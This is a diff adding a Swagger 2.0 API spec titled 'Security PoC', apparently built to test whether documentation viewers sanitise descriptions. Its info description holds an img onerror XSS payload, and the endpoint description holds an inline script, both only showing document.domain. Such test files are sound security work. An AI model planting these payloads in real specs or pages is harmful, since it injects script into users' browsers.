@@ -1,0 +1,21 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Security PoC",
+    "description": "<img src=x onerror=\"alert('XSS-PoC: ' + document.domain)\">",
+    "version": "1.0"
+  },
+  "paths": {
+    "/poc": {
+      "get": {
+        "summary": "PoC endpoint",
+        "description": "<b>XSS PoC</b> — <script>document.title='XSS-PoC-'+document.domain</script>",
+        "responses": {
+          "200": { "description": "OK" }
+        }
+      }
+    }
+  },
+  "host": "localhost",
+  "basePath": "/"
+}
